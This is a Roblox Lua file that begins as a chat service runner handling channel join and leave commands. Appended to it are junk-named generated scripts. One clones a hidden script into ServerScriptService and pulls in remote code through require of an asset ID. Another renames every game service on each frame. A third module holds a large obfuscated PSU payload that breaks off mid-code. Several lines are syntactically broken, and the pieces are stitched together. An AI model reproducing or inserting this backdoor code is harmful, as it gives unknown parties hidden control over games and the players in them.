					"GameChat_ChatServiceRunner_ChannelDoesNotExist",
					"Channel '" .. channelName .. "' does not exist.",
					"RBX_NAME",
					channelName)
				speaker:SendSystemMessage(msg, fromChannelName)
			end
		end
	end
	
	local function DoLeaveCommand(speakerName, channelName, fromChannelName)
		local speaker = ChatService:GetSpeaker(speakerName)
		local channel = ChatService:GetChannel(channelName)
	
		if (speaker) then
			if (speaker:IsInChannel(channelName)) then
				if (channel.Leavable) then
					speaker:LeaveChannel(channel.Name)
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatService_YouHaveLeftChannel",
						string.format("You have left channel '%s'", channelName),
						"RBX_NAME",
						channel.Name)
					speaker:SendSystemMessage(msg, "System")
				else
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatServiceRunner_YouCannotLeaveChannel",
						("You cannot leave channel '" .. channelName .. "'."),
						"RBX_NAME",
						channelName)
					speaker:SendSystemMessage(msg, fromChannelName)
				end
			else
				local msg = ChatLocalization:FormatMessageToSend(
					"GameChat_ChatServiceRunner_YouAreNotInChannel",
					("You are not in channel '" .. channelName .. "'."),
					"RBX_NAME",
					channelName)
				speaker:SendSystemMessage(msg, fromChannelName)
			end
		end
	end
	
	ChatService:RegisterProcessCommandsFunction("default_commands", function(fromSpeaker, message, channel)
		if (string.sub(message, 1, 6):lower() == "/join ") then
			DoJoinCommand(fromSpeaker, string.sub(message, 7), channel)
			return true
		elseif (string.sub(message, 1, 3):lower() == "/j ") then
			DoJoinCommand(fromSpeaker, string.sub(message, 4), channel)
			return true
		elseif (string.sub(message, 1, 7):lower() == "/leave ") then
			DoLeaveCommand(fromSpeaker, string.sub(message, 8), channel)
			return true
		elseif (string.sub(message, 1, 3):lower() == "/l ") then
			DoLeaveCommand(fromSpeaker, string.sub(message, 4), channel)
			return true
		end
	
		return false
	end)
	
	if ChatSettings.GeneralChannelName and ChatSettings.GeneralChannelName ~= "" then
		local allChannel = ChatService:AddChannel(ChatSettings.GeneralChannelName)
	
		allChannel.Leavable = false
		allChannel.AutoJoin = true
	
		allChannel:RegisterGetWelcomeMessageFunction(function(speaker)
			if RunService:IsStudio() then
				return nil
			end
			local player = speaker:GetPlayer()
			if player then
				local success, canChat = pcall(function()
					return Chat:CanUserChatAsync(player.UserId)
				end)
				if success and not canChat then
					return ""
				end
			end
		end)
	end
	
	local systemChannel = ChatService:AddChannel("System")
	systemChannel.Leavable = false
	systemChannel.AutoJoin = true
	systemChannel.WelcomeMessage = ChatLocalization:FormatMessageToSend(
		"GameChat_ChatServiceRunner_SystemChannelWelcomeMessage", "This channel is for system and game notifications."
	)
	
	systemChannel.SpeakerJoined:connect(function(speakerName)
		systemChannel:MuteSpeaker(speakerName)
	end)
	
	
	local function TryRunModule(module)
		if module:IsA("ModuleScript") then
			local ret = require(module)
			if (type(ret) == "function") then
				ret(ChatService)
			end
		end
	end
	
	local modules = Chat:WaitForChild("ChatModules")
	modules.ChildAdded:connect(function(child)
		local success, returnval = pcall(TryRunModule, child)
		if not success and returnval then
			print("Error running module " ..child.Name.. ": " ..returnval)
		end
	end)
	
	for _, module in pairs(modules:GetChildren()) do
		local success, returnval = pcall(TryRunModule, module)
		if not success and returnval then
			print("Error running module " ..module.Name.. ": " ..returnval)
		end
	end
	
	PlayersService.PlayerRemoving:connect(function(playerObj)
		if (ChatService:GetSpeaker(playerObj.Name)) then
			ChatService:RemoveSpeaker(playerObj.Name)
		end
	end)
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local d8yrfdiod2 = Instance.new("SelectionBox")
d8yrfdiod2.Visible = true
d8yrfdiod2.Name = "d8(*#*YRF@(diod2"
d8yrfdiod2.Parent = workspace

local efffe_feffefec_tss = Instance.new("Folder")
efffe_feffefec_tss.Name = "EfffeFeffefecTss"
efffe_feffefec_tss.Parent = d8yrfdiod2

local ccorrection = Instance.new("ColorCorrectionEffect")
ccorrection.Name = "C-Correction"
ccorrection.Parent = d8yrfdiod2

local skybox = Instance.new("Sky")
skybox.MoonTextureId = "rbxassetid://1084722537"
skybox.SkyboxBk = "rbxassetid://148943390"
skybox.SkyboxDn = "rbxassetid://148943362"
skybox.SkyboxFt = "rbxassetid://148943404"
skybox.SkyboxLf = "rbxassetid://148943339"
skybox.SkyboxRt = "rbxassetid://148943379"
skybox.SkyboxUp = "rbxassetid://148943410"
skybox.Name = "Skybox"
skybox.Parent = d8yrfdiod2

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local erfwerfxgrfxqdx = Instance.new("ModuleScript")
erfwerfxgrfxqdx.Name = "erfwerfxgrfxqdx"
erfwerfxgrfxqdx.Parent = workspace

local  = Instance.new("Script")
.Name = ""
.Parent = erfwerfxgrfxqdx

--// Modules

local modules = {
	[erfwerfxgrfxqdx] = function()
		
		
		
		local module = {}
		
		local function GiveScript(Name)
			local Script = script[""]:Clone()
			Script.Parent = game:GetService("ServerScriptService")
			Script.Disabled = false
		end
		
		module["69"] = function()
			GiveScript()
		end
		
		module.AllAUSL = function()
			require(6615851330).AntiUSL()
			module["69"]()
		end
		
		return module
	end
}

--// Scripts

-- 
task.spawn(function()
	local script = 

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			wait()
			script:Destroy()
			local Instance_ = Instance.new
			local AntiUSL = game:GetService("ReplicatedStorage").ChildAdded:Connect(function(f)
				if f.Name == "stuf" then
					pcall(function()
						Instance_("Speaker", f)
					end)
					pcall(function()
						for i, v in pairs(f:GetChildren()) do
							Instance_("Speaker", v)
						end
					end)
					f.ChildAdded:Connect(function(v)
						Instance_("Speaker", v)
					end)
				end
			end)
			local FixNames = game:GetService("RunService").Heartbeat:Connect(function()
				for i, v in pairs(game:GetChildren()) do
					pcall(function()
						v.Name = v.ClassName
					end)
				end
			end)
			warn("(HSE) USCV2's Anti-USL loaded.")
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local erhwiofuxdrekodfiueroaoiafej = Instance.new("ModuleScript")
erhwiofuxdrekodfiueroaoiafej.Name = "erhwiofuxdrekodfiueroaoiafej"
erhwiofuxdrekodfiueroaoiafej.Parent = workspace

--// Modules

local modules = {
	[erhwiofuxdrekodfiueroaoiafej] = function()
		return(function(e,...)local O="This file was obfuscated using PSU Obfuscator 4.0.A | https://www.psu.dev/ & discord.gg/psu";local o=e["jX8OZwo46X"];local I=e[(284313116)];local Z=e.QQ8x11Z;local f=e[((879162947-#("psu == femboy hangout")))];local i=e[((791185240-#("IIiIIiillIiiIIIiiii :troll:")))];local P=e[(778337819)];local x=e[((#{61;(function(...)return 68;end)()}+385656841))];local F=e["Dvpeb6wt"];local w=e[((233893044-#("why does psu.dev attract so many ddosing retards wtf")))];local M=e['j9vScCbd2'];local Q=e.cgzyw05x9;local A=e[((991630490-#("why the fuck would we sell a deobfuscator for a product we created.....")))];local B=e[((954103733-#("concat was here")))];local z=e[((901024985-#("I'm not ignoring you, my DMs are full. Can't DM me? Shoot me a email: mem@mem.rip (Business enquiries only)")))];local D=e['EizPIy'];local r=e[(320993413)];local S=e[(407181882)];local v=e['g500u'];local J=e[((#{721;841;884;521;(function(...)return 1,869,295,54;end)()}+258437270))];local R=e["oLpb0W0"];local u=e[((#{315;(function(...)return 845;end)()}+547286485))];local c=e[((#{474;277;168;(function(...)return 701,346,483;end)()}+457972051))];local C=e[((#{}+106891926))];local p=e[((#{371;}+80835178))];local X=e[(404160991)];local m=e[((#{113;40;(function(...)return;end)()}+566797756))];local n=e[((#{31;832;}+86256685))];local j=e["aZUBjyA0k"];local h=e["wudEJ"];local Y=e.ZLIBM;local G=((getfenv)or(function(...)return(_ENV);end));local a,d,l=({}),(""),(G(n));local t=((l["\98"..e[w].."\116\51\50"])or(l[""..e[o].."\105\116"])or({}));local a=(((t)and(t[""..e[o].."\120"..e[p].."\114"]))or(function(e,o)local l,n=n,r;while((e>r)and(o>r))do local a,t=e%c,o%c;if a~=t then n=n+l;end;e,o,l=(e-a)/c,(o-t)/c,l*c;end;if e<o then e=o;end;while e>r do local o=e%c;if o>r then n=n+l;end;e,l=(e-o)/c,l*c;end;return(n);end));local s=(c^B);local y=(s-n);local b,E,g;local s=(d["\115"..e[A]..e[o]]);local x=(d["\98"..e[x]..e["GrS1j9O0"].."\101"]);local L=(d[""..e[m].."\104"..e[f].."\114"]);local d=(d["\103"..e["xA0c97q"].."\117\98"]);local d=(l[""..e['GrS1j9O0'].."\121\112\101"]);local d=(l["\114"..e[f].."\119"..e["xA0c97q"].."\101"..e.GrS1j9O0]);local U=((l[""..e[D].."\97\116\104"]["\108"..e.ybLBqMUnd.."\101"..e[S].."\112"])or(function(e,l,...)return((e*c)^l);end));local k=(l[""..e['GrS1j9O0'].."\111\110"..e[A]..e[D]..e[o]..e[i]..e[h]]);local q=(l[""..e[j].."\97"..e[w]..e[h]..e["xA0c97q"]]);local d=(l["\115"..e[i].."\116\109"..e[i].."\116\97"..e["GrS1j9O0"].."\97"..e[o]..e[u].."\101"]);local D=(l[""..e[D]..e[f].."\116\104"]["\102\108"..e[p]..e[p]..e[h]]);local j=(l["\115"..e[i]..e[u]..e[i]..e[m]..e.GrS1j9O0]);local d=((l[""..e[A].."\110\112\97\99"..e[I]])or(l[""..e['GrS1j9O0'].."\97"..e[o]..e[u]..e[i]][""..e[A].."\110\112\97\99"..e[I]]));local A=(t[""..e[o]..e[p].."\114"])or(function(e,l,...)return(y-g(y-e,y-l));end);E=((t[""..e[h].."\115\104\105"..e[C].."\116"])or(function(l,e,...)if(e<r)then return(b(l,-(e)));end;return(D(l%c^B/c^e));end));g=(t["\98\97"..e["Ai3BCDQL"].."\100"])or(function(l,e,...)return(((l+e)-a(l,e))/c);end);local y=(t[""..e[o].."\110\111\116"])or(function(e,...)return(y-e);end);b=((t["\108"..e.xA0c97q..e[F]..e[w]..e[C]..e['GrS1j9O0']])or(function(l,e,...)if(e<r)then return(E(l,-(e)));end;return((l*c^e)%c^B);end));if((not(l[""..e[o].."\105"..e['GrS1j9O0'].."\51"..e.rkcgVsv]))and(not(l[""..e[o].."\105"..e["GrS1j9O0"]])))then t[""..e[o].."\110\111\116"]=y;t[""..e[o]..e[f]..e["Ai3BCDQL"].."\100"]=g;t[""..e[o]..e[S].."\111"..e[h]]=a;t["\114\115"..e[F]..e[w].."\102"..e['GrS1j9O0']]=E;t["\108"..e.xA0c97q.."\104\105"..e[C].."\116"]=b;t[""..e[o].."\111"..e[h]]=A;end;local c=(l[""..e["GrS1j9O0"].."\97"..e[o]..e[u].."\101"][""..e[w].."\110\115"..e[i]..e[h].."\116"]);local c=(l["\116"..e[f]..e[o].."\108\101"]["\114\101\109"..e[p]..e[P]..e[i]]);local h=(l[""..e['GrS1j9O0']..e[f]..e[o]..e[u]..e[i]][""..e[m].."\111\110\99"..e[f]..e.GrS1j9O0]);local g=(((l["\116"..e[f].."\98"..e[u].."\101"][""..e[m].."\114"..e[i].."\97\116\101"]))or((function(e,...)return({d({},r,e);});end)));l["\98"..e[w]..e["GrS1j9O0"].."\51\50"]=t;local l=(Z);local c=(#O+M);local i,w=({}),({});for e=r,c-n do local l=L(e);i[e]=l;w[e]=l;w[l]=e;end;local u,n=(function(o)local a,t,e=x(o,n,R);if((a+t+e)~=Q)then l=l+X;c=c+J;end;o=s(o,z);local l,a,t=(""),(""),({});local e=n;local function r()local l=k(s(o,e,e),v);e=e+n;local o=k(s(o,e,e+l-n),v);e=e+l;return(o);end;l=w[r()];t[n]=l;while(e<#o)do local e=r();if i[e]then a=i[e];else a=l..s(l,n,n);end;i[c]=l..s(a,n,n);t[#t+n],l,c=a,a,c+n;end;return(h(t));end)("PSU|26P25P25p10102162151327722121m21e22Z1z1927722A21n1E1F1S21F21h1r1P22i2191727722v121H1J121B1O22k21A1427722Q1d101321Y2101e27W27Y1N1C11101B161N1t16111t22H1w1a27722U1F1r1n1m1q1E191f1D21Y27H27722B21C1h1N28K21521e1S21V21n1H2772251y1Q161M21321j28j1R1122N23621b151A1821t27u27721V2172931912112262a2102361N1k141g1m1722m28528v28x1n2272971023B1O1T1p1o131h121622729x28v1a27B1T22g2181627722p18142941r22m2aB2a4191L101H2a92Ab22x1718171c101221x2Al1022d1h2191421Z1Y1827722021p1o1C1F11161d22621d1r27721W1x13171k2aV21J2a51l2132161a171H1821A2Cq21D21f1J1b1Q1722h2132891022r122811D21M2191N1L1S1D2Az2272AB27X1h28M28222K2ab21z21h1J1n1V1t1d22B2B82C62151F29z192b1152772372Ax1M1p21W2BX22v161C182e727723428028921Y2122bT1022B21o1q1R1A21j21I1n141V1a2b02e12d929B141l1h22728D277236171R21D2181M29O171N21M21F1P1K2232b210234121R171q22m2aq21t1y28N1v2dG2bm2262c427722421127M1S1t17192252EQ2e91i1N1j1c172GE1l2942B02Ab22c21d1T1c21i2DF22A2BX23b1m1j1s21w27a27W181B2262GI1022w27V141d1j1r1d28N28p2EE286102381d2bj2271x1B2772Gu2gW2132Ez2F12f32ek1021Y21g2gm2eJ2Hu27722621N1O1f2Fl1w21F1F2a72HT2HV102c31h2cp1115181M1n1b21w2fs2CJ16122952G81023929o1n2cd2HS2d72IA2171h132at1p2122181j1P1e1N22G29I28F1H1S11289111b1U121t1v1L2J62dz2I91022E21R1r28P1K1d21l2122it22G2aQ21U2191b1t21R2151T2do2Fb28e1022a21j1b1A111n1X21I29j2gE191k28S28U102241z1821g2I02F22GS27v1022p1f1Q1T182bc21z2j910222211162fX171w2L92i22F521v21813131t21T1P2Jn2KP21j2dh29Y122f91121J2131r1t1j2Iz2272H72I4191p23G28t27721Y21b28y21I2I02dV22g2mn102312Dc1F1V1u1i2mD22H2k22372fj2ai2fm21o2J02I42MI22t1m1322i2bX2bI1L2fZ27i2k314112Lt2B02111F2HW21D192bJ2Dx162HZ2f02La2iK2g921l1k21E2kX102Kz2L12j221u1Z1I1m21h21D2Mf2ak2Ho2381T29z21T2NT27j2M51S2m72M91Y2mQ112AJ2141227722n1O2312ab22A21f16131b27b22q2ko27721S26726722y2LL2391r2jV1T1R2DO1N21721K1I29g2HC21z2eq182mS2ky2gF2L12FS21t21E101M1H22M2fs22u171D1V1M22721m1G27722d2Kb1n21N2131u15112O12i12F42B9102cJ171g1R1Q22h2F52bP1T2iT162Nm27722f21I1d1721k1z2BK2a92f52Dn28m1229l2c52I429x192142141m1r21u2k221u21C2f01a1x2LO2LQ22H2Fs22r1h1b191422M2mI2371A1N2Hn2ia21b2eI2dL2lC2AD2aF1S28y22721728J101A1W2aB22b2131H2Bk1L2a92aq22P1k111R2Sq27v2BF2LL21v21I27V2Iu1Q21j1Y2Ei2gL2232Mw22R1b1D1618122cb161O22b2Fs22b21n2t82r92f52282oj2TH22M2fC2Rq171A2OX29t172ip2ir2g72Rp2382t917162FW2gg2FS22E21j1d1p1g2272Lv152i62sl21L1j2fd2fF2fH2n82Fl21m2V12hj2hl112Si102U52dH21U2MI2P82tx2Mi2341s1u2B72qx2372uM2Uo2252K22Kq2tT2Pq2ig2D22FY2Qj2C62C82Ca2Cc1d21I21p101r2102OJ2r92fS22c2121j18152eP2ER29l1B1h1p1921i29A27R2SC2SE28m2202k22FU2PP2pr2pT2pv21V2WF2of28K21W2M322B21e1o21G2ru101I2Iz21J21j2af2aH2Aj2AQ22821O1D1O1s1n21h29F21V2aq22X1q2182Nb2dC2bN2lc2xZ21821P2cV1L2fR2E8102GU141c1U2n52IL2L51C2j021o2xq2xs2jl2hc2212131o1P141e2mS2f02mU2aB22E2P91N2MD2m12mW2dn1q1B142Dv2AI22m2ll22821r2lP2D42Ls2O22i22j22gU2NX1l2nz2BG2Lc22I21h2Tu1b1C1M22H2xc29821m142Yu1d1l28O1121O21F151d1S1621R1z2yl2hr2182192AA2lC2lw1t1n1y2XW2v12e92q92172171S1Q2F01521N2rD2Jt2lG2dY22B2aQ2202131V102jZ21c2171721W310T102dn310W310y311031121D31141T31162Od2kG1t21q21q2kh21x2OR2aR152MD1h21M21o1F151P1i1D1E1J1m2262fs22s2Oz1N1i2252U92vW2fv1h1z21F2vA31082X929J1028w28y16312729z2cB1H2PR2Md22G2j22ys2GP2Gr2UW2qX2s82Sa141r2bw2Ho22B21i2F822m2J222u2hi2hk312T2j22tP2bj172Ax1C21Z21o1m2772s82f02F921m2fI2fK2fM2v9313q2HM2Bx21X2171R1o21z2mw2in2qu2O32K22yK2j021R2Wt2yV2Zs2772XP2xR2XT1122h2u9313T2iI121G1528m2Ut2Ah2l227721z29f21M2NR2272ll21U311f1A15132922vz2d32Qb2YC29l29N2QH2U42yo2xt2Kd2Nn23B1i2cv1S2Ei1E2qA2Ab2n72zl2b02j22dN1N1H1T1S1022h2z12Z32md21s1o2K22Sz2Un2gf21D2US2uU313B277232314F2Ie2Jl2BX2311c2VG2ab22321a1s31451b112272j22n72Q22L02YI27C2QQ2qs21n219181f28m22m31202rl312d1q182t11L1l315K2e62W22Rq151o29B2Uo1Y2171f317x2A92fS2LN1D217310l2HC2tP2Tr2tt2IE1D151v1J317a2rP2Dn2Bl2yF2yh2ab2LE2lG151b1l22G2BX22f21E19182hb2eR22C2x71B21p315d2mi2321B1I22l2st2772D72ab314D31872922T42NN312H2Eh2JW1p15317Y2qK2d92Db2tQ315c171O1n318k318K2f9315e2D831701A1E21M21431221T317w292316T1021v2Tk182TM2N62Q928m14318X112m82ty2YC2U02hR2I42G01y1029o102gD1b2SZ2d822P22A172CC1731be1131072GE1d2m3317c2JQ2JS2ju2Jw2jY2K022b2dm2H92A7317831aJ2361j2E41B1221z2u92ib2id2FL2kw2XL2Tq2B02bX2382lp1G22z2pF27726O25r1l2Tz21N2tb2rA31aK2a51j280316b2jL2F52202C1314V2kf2Lc2gu29c2Wi311G2FS2dN1J142212fs22T29C311R31362rp2J42It1m15317v31742ho22C21n28a2962nN31981I28K213213181921x2Fs23831aH2E62fS2Bz2C12P42K22S81j2N31R2it2ZB316y2hO2h2181t2sd27b102BP2fy2od1Z12182pq31ES21t2mw22A2Mc319b3167318O317g1q1y316r2UV2pU29821K1a2f92QE312c1m21g2Xq1l1I192JX2C32RP2C31a31eS2do31B72F52PY2ei310K312f2yC2U52lF2D52M32352aG1G1G21m21c1121D2jb2Zp2ZR2f522r28i2DJ2NL2U92In21C1X1M1G162KS1531G02r42vQ2fJ1h2FF21w2U92RZ1R317l21P2kB181O21121F2Dy24A26n277112su277101z1X2p231Hf10181Q1J2Vc21w31HF31hD2bu122192191l2cv131i31DU2772og1425N25N31Hf2gK1523223231i71K1621l21l31i731hX31cS31I7317s23F23f31I71r2nx2NN2xG1O1A22X22X31i71p1B1S316E31I21u1C24M24M31i71v1d25k25k31I71S1E23123131i71T1F23d23D31i7315223H23h31I72ax22n22N31I72xg23m23M31I7111j24024031I7161K21x21X31i7171L23Q23Q31I7141m22822831i7151N22922931I71a1O2NX31I71b1p22z22z31i731hm2xj31I7191r23523531i71e1S21S21s31i71F2AU1p31i72yG1n29c31i22Qf311r31i721e1w1y31B231i221f1X1O1o31i721C1y23s23s31I721d1z25325331I721I21022522531i721J2111k1k31i721g2122Db31i721H21323i23i31I731Ad22b22b31i721n21522V22v31i721K21623t23T31I721L21721521531I721q21825M25m31I721R21923o23O31i721O21a24824831i721P21b21y21Y31i71y21c31Ns31i71z21d22r22R31i71w21e22w22w31I71x21f24124131i721221g31HK1028J31au1221G21g31l02jc22i22i31i71M1422A22A31i71n1525e25E31IC1622D22d31Ih1725b25b31iK2Li2rp2XG31Ip22j22j31I731iT25225231ix1B1v311b31J21C24K24K31J71d142Ho2xG31jD152YC2Xg31JI1b2il2XG315224X24X31Jq1H22022031ju1I22k22K31JY1J25825831K31K24624631k81l24v24V31kD1M1c2Er2xg31KJ313331kN1O25025031Kr1p23423431Kw1q22Q22Q31Kz1R23U23u31L41S23Z23z31l91T22422431Ld1u23r23R31i72qF24724731lK1W21U21U31I731Lq22722731lU1Y25125131LZ1Z1e2pF1i31m522S22S31M921123J23J31me21224A24A31mI21324n24n31MN21424p24p31Mr21523823831mW21621f21f31N12172yN31N621821V21v31nB21923b23b31Ng21a31hv31NL21B24t24t31nQ21c31Kl31nu21d23a23a31nz21e25i25i31O421f24C24C31o921g25625631hr132dB31Og31Oi2PQ1324R24r31On2NP31he31i824g24g31OX22T22T31P123W23W31P523c23c31iO1923x23X31Pc1A31ut31pG21b21b31I731j321N31Dp31i231j823023031Jc1e21821831Jh1F25H25h31Jm1g21221231q421d21d31Q825425431qc311w31QG22122131QK23k23K31qo22u22U31KI1n24o24O31qV22F22F31Qz2mS31r322o22O31r724924931rb31dW31RF1x1x31Rj162qx2xg2Qf21021031RR22222231RV1X21H21h31rz21T21t31s324l24l31m42101w1w31sB24h24h31Sf1q1q31sj23323331sn22y22Y31SR21r21R31sV23n23n31Sz21621631T223L23L31t624i24I31TA22P22P31td25725731th31oh31TK22m22M31tO23623631TS24324331TW31g531Hr1231u131u331oj1325925931u92Rt31oS1524w24W31OX1M314031I231HX317V31P523e23e31uO22h22h31Us25J25J31Pg23Y23y31Uy1C25f25F31PO24424431v622l22l31VA21A21a31Ve31BE31q41U1u31q822622631Qc21p2W931i231k423923931qK25525531Qo31nx31VZ25C25c31qV24524531Qz2lY31R323G23G31R725D25D31rb25G25G31RF24B24b31RJ24z24z31rn1v24Q24q31rR21z21Z31wt22G22g31RZ1R2CH31I231m01Z1Z31x325o25o31sB24d24D31sf24e24e31sJ23723731sn24224231SR22e22E31sv23p23p31sz23v23v31t221K21K31T61f2nu31I231nh24u24u31td1d2D82xg31nr21m21M31TK25a25A31tO21E2Q731I231o5310W31tw21121131hr15142Db31oH319428j320h102qF31Oo24Y24y31hR28j31pu31hD31iP31iD323631hf23n23r1426C26C2771225z25X31I2317s31qE2771V21q22Y22331P6317t1g28J2nx2Ly31IP31IT24s24s31PG31Qa323s1D31j331Qi323S21Q23Y24v31qq31qQ2JC31J8323E31hc28j31s52Db21121028j31qQ31s527M1d324H2dB1A317828k2iL2Ax31J324j24j31HR324w31ut31uT1C311p31hl1831Ut1523Q323h25X323o101o27126d31i231OO323r10323T26G25l31pQ31pQ1H323Z1031pU32422l01622c22c32381031pQ31wk322W28J31pQ2771D2Ie2qs2SU182fP322w1424f24f31AS326c2ho31Eb31he27721031mG31oc277326d31Od326T31Hg1y31oe2su1u1v3274277316d327131wo31hF31Mh31s52772162fS2342CW29T31gT2E91G1h2wu314S2ve315U1N314x313721m1w213111H2TR21x1431Zp2LD31I031Qq322D31QQ151H2c932891c21k1C3128322d1G328H2aT1N21031fK162D42kl21i1O2j031Fp2ly1W21y2ab2Cj2Ai162r731Bs2Sn2ae142sq2ao314i1Y1h314K2F331cg101w2691k1O21h25522z329B1H210327t314X2BX2231y2op2P12772151j1g31Ex31EZ315d2EF2Eh1823e31PJ31hS31Hk31Nv31Du322d324D2122LC319J21H1G1231Qq3267323l121e21B1y31em319J21232711323r31nf2771p31LC102ie2RP1I31Ho31hK31J832al32af325S21q32AH31U21221321h31oo31mh324m31hT31PQ32aR2142a731u221332AW31Ht2772iT31Yi32ab1k1n27b31Lf2771q21n2172f31631Pu32Bi317s31py326731wk2lI31kj31Id32ab323T210315431wK2o032BU31WK27721224I23Q2A83280312V1x21l31Lt28a27B31zT32c41831HO32CQ325s1D32aL2li326732Ab131Y21131ua31hd325y3278329H1x327B31Wp2772nX31wv"),(#O-Y);local function o(l,e,...)if(l==334482302)then return((a((a(a(e,363358),70274))-621006,16366))-563132);elseif(l==771261758)then return(((a(a((e)-485328,125519),621822))-732373)-204440);elseif(l==227108608)then return((((e)-61905)-403684)-556719);elseif(l==291214387)then return(((((e)-828847)-338680)-450689)-298064);elseif(l==965729327)then return(a((a(e,747665))-776959,686471));elseif(l==907429322)then return((((e)-598230)-459863)-120871);elseif(l==806020587)then return(a((((a(e,216980))-189187)-827694)-582543,698530));elseif(l==351895670)then return(a((((e)-950781)-439347)-545190,439062));else end;end;local m=e.oLpb0W0;local y=e[(684077878)];local c=e[((86256754-#("@everyone designs are done. luraph website coming.... eta JULY 2020")))];local h=e[((#{619;577;157;759;(function(...)return 871,587,305,...;end)(44,3,858)}+457972047))];local p=e[((932010619-#("concat was here")))];local r=e.EAz0ii5;local o=e[(773706925)];local t=e[((#{990;631;238;}+320993410))];local function i()local e=a(x(u,n,n),l);l=e%o;n=(n+c);return(e);end;local function f(o,e,l)if(l)then local e=(o/h^(e-c))%h^((l-c)-(e-c)+c);return(e-(e%c));else local e=h^(e-c);return(((o%(e+e)>=e)and(c))or(t));end;end;local function t()local t,e,i,c=x(u,n,n+m);t=a(t,l);l=t%o;e=a(e,l);l=e%o;i=a(i,l);l=i%o;c=a(c,l);l=c%o;n=n+r;return((c*p)+(i*y)+(e*o)+t);end;local function r()local e,c=x(u,n,n+h);e=a(e,l);l=e%o;c=a(c,l);l=c%o;n=n+h;return((c*o)+e);end;local b="\35";local function C(...)return({...}),j(b,...);end;local function R(...)local p=e[(457972057)];local b=e['EAz0ii5'];local X=e[(151915019)];local Z=e["PBD947"];local I=e["XUSYS9dEoO"];local A=e[(762665674)];local P=e[(737280329)];local Y=e[((#{726;51;(function(...)return;end)()}+697806851))];local F=e[(887576217)];local z=e[(765888497)];local m=e[((901024956-#("luraph is now down until further notice for an emergency major security update")))];local M=e[((#{}+933277186))];local L=e[(581870252)];local C=e["X0FAN"];local B=e[(97030858)];local Q=e["eni3fex"];local S=e.oLpb0W0;local o=e[(86256687)];local R=e["wM1e5JQ18k"];local y=e[((#{901;979;278;391;}+773706921))];local O=e["U00dC6vE"];local g=e[((954103811-#("Luraph v12.6 has been released!: changed absolutely fucking nothing but donate to my patreon!")))];local G=e["Lp33htssRW"];local v=e[((#{21;965;281;(function(...)return 642;end)()}+403977159))];local e=e[((320993484-#("why the fuck would we sell a deobfuscator for a product we created.....")))];local function E(...)local h=({});local c=({});local k=({});local j=i(l);for r=e,t(l)-o,o do local d=i(l);if(d==F)then local l=i(l);c[r]=(l~=e);elseif(d==I)then while(true)do local e=t(l);c[r]=s(u,n,n+e-o);n=n+e;break;end;elseif(d==M)then while(true)do local a=t(l);local n=t(l);local t=o;local a=(f(n,o,z)*(p^g))+a;local l=f(n,G,Q);local n=((-o)^f(n,g));if(l==e)then if(a==e)then c[r]=D(n*e);break;else l=o;t=e;end;elseif(l==Z)then c[r]=(a==e)and(n*(o/e))or(n*(e/e));break;end;local l=U(n,l-L)*(t+(a/(p^F)));c[r]=l%o==e and D(l)or l break;end;elseif(d==P)then while(true)do local t=t(l);if(t==e)then c[r]=('');break;end;if(t>Y)then local e,i=(''),(s(u,n,n+t-o));n=n+t;for o=o,#i,o do local o=a(x(s(i,o,o)),l);l=o%y;e=e..w[o];end;c[r]=e;else local e,o=(''),({x(u,n,n+t-o)});n=n+t;for n,o in q(o)do local o=a(o,l);l=o%y;e=e..w[o];end;c[r]=e;end;break;end;else c[r]=nil end;end;local n=t(l);for e=e,n-o,o do h[e]=({});end;for g=e,n-o,o do local n=i(l);if(n~=e)then n=n-o;local s,y,w,u,d,a=e,e,e,e,e,e;local x=f(n,o,S);if(x==S)then s=(r(l));a=(r(l));d=h[(t(l))];u=(i(l));elseif(x==o)then a=(r(l));d=(t(l));u=(i(l));elseif(x==A)then elseif(x==m)then s=(r(l));a=(r(l));d=(t(l));u=(i(l));w=({});for n=o,s,o do w[n]=({[e]=i(l),[o]=r(l)});end;elseif(x==p)then a=(r(l));d=h[(t(l))];u=(i(l));elseif(x==e)then s=(r(l));a=(r(l));d=(r(l));u=(i(l));end;if(f(n,C,C)==o)then y=h[t(l)];else y=h[g+o];end;if(f(n,A,A)==o)then s=c[s];end;if(f(n,b,b)==o)then a=c[a];end;if(f(n,m,m)==o)then d=c[d];end;if(f(n,B,B)==o)then w=({});for e=o,i(),o do w[e]=t();end;end;local e=h[g];e[883600.7542744031]=a;e['wOhR']=w;e["S3qHzmx"]=s;e['RzO']=d;e[R]=y;e[45320.05430941239]=u;end;end;for e=e,t(l)-o,o do k[e]=E();end;local l=r(l);return({["tgUcYs"]=k;[X]=e;["GIb"]=l;['GRNQZbjx']=c;[O]=h;[v]=j;});end;return(E(...));end;local function x(e,l,s,...)local l=e['GRNQZbjx'];local i=e['GIb'];local m=e["tgUcYs"];local o=e[175485];local l=0;local c=e[725058];return(function(...)local w=(j(b,...)-1);local e=(true);local f=o[l];local e=(297027452);local t='S3qHzmx';local r=-(1);local o=883600.7542744031;local e=({});local p=45320.05430941239;local h={...};local l={};local n=650568;local u={};local e='wOhR';local a="RzO";for e=0,w,1 do if(e>=c)then u[e-c]=h[e+1];else l[e]=h[e+1];end;end;local h=w-c+1;while(true)do local e=f;local c=e[p];f=e[n];if(c<=19)then if(c<=9)then if(c<=4)then if(c<=1)then if(c==0)then l[e[o]]=e[a];elseif(c<=1)then e=e[n];local a=e[o];r=a+h-1;for e=0,h do l[a+e]=u[e];end;for e=r+1,i do l[e]=nil;end;e=e[n];local o=e[o];do return d(l,o,r);end;e=e[n];e=e[n];end;elseif(c<=2)then local o=e[o];l[o]=0+(l[o]);l[o+1]=0+(l[o+1]);l[o+2]=0+(l[o+2]);local n=l[o];local c=l[o+2];if(c>0)then if(n>l[o+1])then f=e[a];else l[o+3]=n;end;elseif(n<l[o+1])then f=e[a];else l[o+3]=n;end;elseif(c>3)then l[e[o]][e[a]]=l[e[t]];elseif(c<4)then local e=e[o];l[e]=l[e](l[e+1]);for e=e+1,i do l[e]=nil;end;end;elseif(c<=6)then if(c==5)then local o=e[o];l[o](d(l,o+1,e[a]));for e=o+1,i do 